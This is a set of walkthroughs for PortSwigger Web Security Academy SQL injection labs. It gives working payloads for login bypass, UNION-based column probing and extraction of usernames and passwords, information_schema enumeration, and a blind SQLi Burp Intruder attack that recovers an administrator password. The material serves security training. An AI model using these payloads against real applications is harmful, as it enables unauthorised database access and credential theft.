# SQL Injection LAbs
=====================================================================================
## APPRENTICE
=====================================================================================

-------------------------------------------------------------------------------------
### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
-------------------------------------------------------------------------------------
SQL vuln in the address bar.
Payload →
```
web-security-academy.net/filter?category=Gifts' OR 1=1 --
```
-------------------------------------------------------------------------------------
### SQL injection vulnerability allowing login bypass
-------------------------------------------------------------------------------------

- The SQL injection vuln in the username field can be detected by entering a single coma (’) into it which produces a server side error on the application.
- This error is because we have disturbed the functionality of the sql query.

Payload →

Enter administrator’-- in the username filed and any random password.



Alternatevely, you can use burpsuit to intercept the request as well.
=====================================================================================
## PRACTITIONER  
=====================================================================================

-------------------------------------------------------------------------------------
### SQL injection UNION attack, determining the number of columns returned by the query
-------------------------------------------------------------------------------------

There is a chance of SQL Union injection in the url as the application is rendering a table of information which is probalby from a particular table in the db.

For SQL Union attack, the correct number of entries being requested in the orignal query is to be determined by the trial and error method which in this case is 3.
```
web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,NULL,NULL--
```
-------------------------------------------------------------------------------------
### SQL injection UNION attack, finding a column containing text
-------------------------------------------------------------------------------------

Hit and trial to find the number of columns in the default query.
![image](https://github.com/coder-de-coder/portswigger-academy-solutions/assets/108211570/27b99d53-31d9-4f6d-87de-130f15dc6258)

(BurpSuit ScreenShot shows that we hit the target with 3 NULLs)

Now try replacing each NULL one by one with the given random string in the lab using single quotes.

Payload =>
```
web-security-academy.net/filter?category=Accessories+UNION+SELECT+NULL,{Your string},NULL--
```
-------------------------------------------------------------------------------------
### SQL injection UNION attack, retrieving data from other tables
Payload ->
```web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username,+password+FROM+users--
```
-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------
### SQL injection UNION attack, retrieving multiple values in a single column
It can be tested that though the default query is fetching two columns but the first one cant be used as it is not of string type.

Now that we have only one entry to retrive two columns from the users table, we can use the CONCAT({query1}, {query2}) functionality of MySQL.

Payload ->
```web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+CONCAT(username,password)+FROM+users--```
-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------
### SQL injection attack, listing the database contents on non-Oracle databases
First find out the number of columns being queried in the orignal req but using the follwoing payload (2 in this case).
```'+union+select+null,null--```
 Every SQL database has an information schema that contains the list of tables. Use the following payload to retrive that list of tables.
 This search for user tables in that list.
 ```'union+select+column_name,+null+from+information_schema.tables-- ```

 Now that you have found the exact name of the user table, use it to extract the exact column names out of it using the following payload
 ```'+union+select+column_names,+null+from+information_schema.columns+where+table_name="{user table name found in last step}" --```

 After finding the column names, use those to extract the usernames and passwords from the same table.

-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------
### Blind SQL injection with conditional responses
- Capture the homepage req in burpsuit and send to ***repeater.***
- Observe the TrackingID cookie and test it for blind SQLi using the following paylload →
```' AND '1'='1 ```

This shall render the term “Welcome back!” in the response and if the condition is changed to ‘1’=’2 , then it should not render the term. This confirms the presence of blind SQLi.

Now send the request to Intruder and use the following payload in the cookie section along with the same payload markers.
```ookie: TrackingId=0k9eqmdznTZaHkW7' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), §1§, 1) = '§a§;```

- Use the intruder in cluster bomb mode (read its description to know why), and add two payload sets →
    - First one having the counts of 1 to 20 (this is the length of the password).
    - Second one having letters a to z & number 0 to 9.

Start the attack and wait for it to complete.
Now filter the results acc to character length.
There will be 20 such entries which will be longer than the rest of the result.
Open response tab from any of theese 20 and search for the keyword “Welcome Back”, to make sure theese are the desired entries.
Note the payload value corresponding to these 20 entries and arrange them to get the password for the administrator.


-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------